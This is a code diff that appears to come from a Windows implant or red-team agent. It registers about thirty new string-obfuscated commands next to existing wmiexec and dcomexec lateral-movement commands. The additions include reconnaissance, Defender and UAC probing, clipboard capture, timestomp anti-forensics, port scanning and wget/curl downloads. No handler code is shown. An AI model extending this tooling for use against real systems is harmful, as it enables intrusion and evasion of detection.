@@ -1,8 +1,8 @@
-#include "commands.h"
 #include "config.h"
+#include "commands.h"
 #include "common.h"
 
-#define MAX_COMMANDS 64
+#define MAX_COMMANDS 96
 
 static COMMAND_ENTRY g_commands[MAX_COMMANDS];
 static DWORD g_command_count = 0;
@@ -136,6 +136,96 @@ VOID register_commands(PINSTANCE inst) {
 #endif
 #ifdef INCLUDE_CMD_WMIEXEC
     _register(XSTR("wmiexec"), cmd_wmiexec);
+#endif
+#ifdef INCLUDE_CMD_ENV
+    _register(XSTR("env"), cmd_env);
+#endif
+#ifdef INCLUDE_CMD_DRIVERS
+    _register(XSTR("drivers"), cmd_drivers);
+#endif
+#ifdef INCLUDE_CMD_TASKS
+    _register(XSTR("tasks"), cmd_tasks);
+#endif
+#ifdef INCLUDE_CMD_SERVICES
+    _register(XSTR("services"), cmd_services);
+#endif
+#ifdef INCLUDE_CMD_SOFTWARE
+    _register(XSTR("software"), cmd_software);
+#endif
+#ifdef INCLUDE_CMD_NETSTAT
+    _register(XSTR("netstat"), cmd_netstat);
+#endif
+#ifdef INCLUDE_CMD_ARP
+    _register(XSTR("arp"), cmd_arp);
+#endif
+#ifdef INCLUDE_CMD_ROUTE
+    _register(XSTR("route"), cmd_route);
+#endif
+#ifdef INCLUDE_CMD_LOCALGROUP
+    _register(XSTR("localgroup"), cmd_localgroup);
+#endif
+#ifdef INCLUDE_CMD_SHARE
+    _register(XSTR("share"), cmd_share);
+#endif
+#ifdef INCLUDE_CMD_DOMAININFO
+    _register(XSTR("domaininfo"), cmd_domaininfo);
+#endif
+#ifdef INCLUDE_CMD_UAC
+    _register(XSTR("uac"), cmd_uac);
+#endif
+#ifdef INCLUDE_CMD_DEFENDER
+    _register(XSTR("defender"), cmd_defender);
+#endif
+#ifdef INCLUDE_CMD_WINDOWLIST
+    _register(XSTR("windowlist"), cmd_windowlist);
+#endif
+#ifdef INCLUDE_CMD_UPTIME
+    _register(XSTR("uptime"), cmd_uptime);
+#endif
+#ifdef INCLUDE_CMD_QUSER
+    _register(XSTR("quser"), cmd_quser);
+#endif
+#ifdef INCLUDE_CMD_FIND
+    _register(XSTR("find"), cmd_find);
+#endif
+#ifdef INCLUDE_CMD_GREP
+    _register(XSTR("grep"), cmd_grep);
+#endif
+#ifdef INCLUDE_CMD_TREE
+    _register(XSTR("tree"), cmd_tree);
+#endif
+#ifdef INCLUDE_CMD_STAT
+    _register(XSTR("stat"), cmd_stat);
+#endif
+#ifdef INCLUDE_CMD_TIMESTOMP
+    _register(XSTR("timestomp"), cmd_timestomp);
+#endif
+#ifdef INCLUDE_CMD_WGET
+    _register(XSTR("wget"), cmd_wget);
+#endif
+#ifdef INCLUDE_CMD_PSGREP
+    _register(XSTR("psgrep"), cmd_psgrep);
+#endif
+#ifdef INCLUDE_CMD_PROCINFO
+    _register(XSTR("procinfo"), cmd_procinfo);
+#endif
+#ifdef INCLUDE_CMD_CLIPBOARD
+    _register(XSTR("clipboard"), cmd_clipboard);
+#endif
+#ifdef INCLUDE_CMD_PING
+    _register(XSTR("ping"), cmd_ping);
+#endif
+#ifdef INCLUDE_CMD_DNS
+    _register(XSTR("dns"), cmd_dns);
+#endif
+#ifdef INCLUDE_CMD_PORTSCAN
+    _register(XSTR("portscan"), cmd_portscan);
+#endif
+#ifdef INCLUDE_CMD_CURL
+    _register(XSTR("curl"), cmd_curl);
+#endif
+#ifdef INCLUDE_CMD_SPOOF_TEST
+    _register(XSTR("spooftest"), cmd_spooftest);
 #endif
 #ifdef INCLUDE_CMD_DCOMEXEC
     _register(XSTR("dcomexec"), cmd_dcomexec);
